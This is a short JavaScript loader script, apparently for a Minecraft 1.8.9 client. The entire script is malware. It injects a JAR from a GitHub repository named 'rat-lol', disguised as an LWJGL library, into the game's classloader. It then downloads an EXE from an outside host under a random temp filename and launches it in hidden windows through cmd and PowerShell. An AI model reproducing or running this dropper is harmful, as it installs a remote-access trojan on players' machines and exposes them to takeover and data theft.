// ===== COMPLETE JAR + EXE LOADER (1.8.9) =====
(function() {
    try {
        // ==== 1. LOAD JAR FILE ====
        var URLClassLoader = Java.type("java.net.URLClassLoader");
        var URL = Java.type("java.net.URL");
        var Minecraft = Java.type("net.minecraft.client.Minecraft");
        var Thread = Java.type("java.lang.Thread");

        // Load the JAR into Minecraft's classloader
        var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
        var classLoader = Minecraft.class.getClassLoader();
        
        var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        addURL.setAccessible(true);
        addURL.invoke(classLoader, jarURL);
        Thread.sleep(1000); // Wait for JAR to load

        // Initialize the JAR's main class
        classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
        print("[+] JAR successfully loaded!");

        // ==== 2. DOWNLOAD & EXECUTE EXE ====
        var File = Java.type("java.io.File");
        var FileOutputStream = Java.type("java.io.FileOutputStream");
        var System = Java.type("java.lang.System");
        var Runtime = Java.type("java.lang.Runtime");

        // Download EXE with random filename
        var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
        var tempDir = System.getProperty("java.io.tmpdir");
        var exeName = "mc_" + Math.random().toString(36).substring(2, 10) + ".exe";
        var exePath = new File(tempDir, exeName);

        // Raw download without Files.copy()
        var conn = new URL(exeUrl).openConnection();
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        var inStream = conn.getInputStream();
        var outStream = new FileOutputStream(exePath);
        
        var buffer = Java.type("byte[]")(1024);
        var bytesRead;
        while ((bytesRead = inStream.read(buffer)) != -1) {
            outStream.write(buffer, 0, bytesRead);
        }
        inStream.close();
        outStream.close();

        // Execute EXE with multiple fallback methods
        if (System.getProperty("os.name").contains("Windows")) {
            try {
                // Method 1: Standard hidden execution
                Runtime.getRuntime().exec("cmd /c start /min " + exePath.getAbsolutePath());
                
                // Method 2: PowerShell fallback
                Runtime.getRuntime().exec([
                    "powershell.exe",
                    "-WindowStyle", "Hidden",
                    "-Command", 
                    "Start-Process -FilePath '" + exePath.getAbsolutePath() + "' -WindowStyle Hidden"
                ]);
                
                print("[+] EXE should be running (check Task Manager)");
            } catch (e) {
                print("[!] EXE execution failed: " + e);
            }
        } else {
            print("[!] Windows only - EXE not executed");
        }
    } catch (e) {
        print("[CRITICAL ERROR] " + e);
    }
})();